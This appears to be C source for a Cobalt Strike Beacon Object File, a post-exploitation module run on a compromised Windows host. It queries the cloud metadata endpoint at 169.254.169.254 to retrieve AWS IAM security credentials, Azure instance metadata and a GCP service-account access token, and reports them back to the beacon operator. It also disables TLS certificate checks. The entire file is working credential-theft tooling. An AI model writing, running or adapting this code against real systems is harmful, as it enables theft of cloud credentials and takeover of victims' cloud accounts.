#include <windows.h>
#include <winhttp.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI WINHTTP$WinHttpOpen(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI WINHTTP$WinHttpConnect(HANDLE, LPCWSTR, INTERNET_PORT, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI WINHTTP$WinHttpOpenRequest(HANDLE, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpSendRequest(HANDLE, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpReceiveResponse(HANDLE, LPVOID);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpReadData(HANDLE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpCloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpSetOption(HANDLE, DWORD, LPVOID, DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void*);

#define WINHTTP_FLAG_SECURE 0x00800000
#define WINHTTP_OPTION_SECURITY_FLAGS 31

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int mode = BeaconDataInt(&parser);
    char *param = BeaconDataExtract(&parser, NULL);
    
    HINTERNET hSession = WINHTTP$WinHttpOpen(L"Mozilla/5.0", 0, NULL, NULL, 0);
    if (!hSession) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpOpen failed: %d", KERNEL32$GetLastError());
        return;
    }
    
    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | 
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WINHTTP$WinHttpSetOption(hSession, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    
    if (mode == 0) {
        // AWS metadata
        HINTERNET hConnect = WINHTTP$WinHttpConnect(hSession, L"169.254.169.254", 80, 0);
        if (hConnect) {
            HINTERNET hRequest = WINHTTP$WinHttpOpenRequest(hConnect, L"GET", 
                L"/latest/meta-data/iam/security-credentials/", NULL, WINHTTP_NO_REFERER, NULL, 0);
            if (hRequest) {
                if (WINHTTP$WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                    WINHTTP$WinHttpReceiveResponse(hRequest, NULL)) {
                    char buffer[4096] = {0};
                    DWORD bytesRead = 0;
                    WINHTTP$WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);
                    BeaconPrintf(CALLBACK_OUTPUT, "=== AWS IAM Credentials ===");
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
                }
                WINHTTP$WinHttpCloseHandle(hRequest);
            }
            WINHTTP$WinHttpCloseHandle(hConnect);
        }
    }
    else if (mode == 1) {
        // Azure metadata
        HINTERNET hConnect = WINHTTP$WinHttpConnect(hSession, L"169.254.169.254", 80, 0);
        if (hConnect) {
            HINTERNET hRequest = WINHTTP$WinHttpOpenRequest(hConnect, L"GET", 
                L"/metadata/instance?api-version=2021-02-01", NULL, WINHTTP_NO_REFERER, NULL, 0);
            if (hRequest) {
                wchar_t headers[] = L"Metadata: true\r\n";
                if (WINHTTP$WinHttpSendRequest(hRequest, headers, (DWORD)-1, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                    WINHTTP$WinHttpReceiveResponse(hRequest, NULL)) {
                    char buffer[8192] = {0};
                    DWORD bytesRead = 0;
                    WINHTTP$WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);
                    BeaconPrintf(CALLBACK_OUTPUT, "=== Azure Instance Metadata ===");
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
                }
                WINHTTP$WinHttpCloseHandle(hRequest);
            }
            WINHTTP$WinHttpCloseHandle(hConnect);
        }
    }
    else if (mode == 2) {
        // GCP metadata
        HINTERNET hConnect = WINHTTP$WinHttpConnect(hSession, L"169.254.169.254", 80, 0);
        if (hConnect) {
            HINTERNET hRequest = WINHTTP$WinHttpOpenRequest(hConnect, L"GET", 
                L"/computeMetadata/v1/project/service-accounts/default/token", NULL, WINHTTP_NO_REFERER, NULL, 0);
            if (hRequest) {
                wchar_t headers[] = L"Metadata-Flavor: Google\r\n";
                if (WINHTTP$WinHttpSendRequest(hRequest, headers, (DWORD)-1, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                    WINHTTP$WinHttpReceiveResponse(hRequest, NULL)) {
                    char buffer[4096] = {0};
                    DWORD bytesRead = 0;
                    WINHTTP$WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);
                    BeaconPrintf(CALLBACK_OUTPUT, "=== GCP Access Token ===");
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
                }
                WINHTTP$WinHttpCloseHandle(hRequest);
            }
            WINHTTP$WinHttpCloseHandle(hConnect);
        }
    }
    else if (mode == 3) {
        // All cloud metadata
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Checking AWS metadata...");
        // Reuse mode 0 logic
        HINTERNET hConnect = WINHTTP$WinHttpConnect(hSession, L"169.254.169.254", 80, 0);
        if (hConnect) {
            HINTERNET hRequest = WINHTTP$WinHttpOpenRequest(hConnect, L"GET", 
                L"/latest/meta-data/", NULL, WINHTTP_NO_REFERER, NULL, 0);
            if (hRequest) {
                if (WINHTTP$WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                    WINHTTP$WinHttpReceiveResponse(hRequest, NULL)) {
                    char buffer[4096] = {0};
                    DWORD bytesRead = 0;
                    WINHTTP$WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);
                    BeaconPrintf(CALLBACK_OUTPUT, "=== AWS Metadata ===");
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
                }
                WINHTTP$WinHttpCloseHandle(hRequest);
            }
            WINHTTP$WinHttpCloseHandle(hConnect);
        }
    }
    
    WINHTTP$WinHttpCloseHandle(hSession);
}
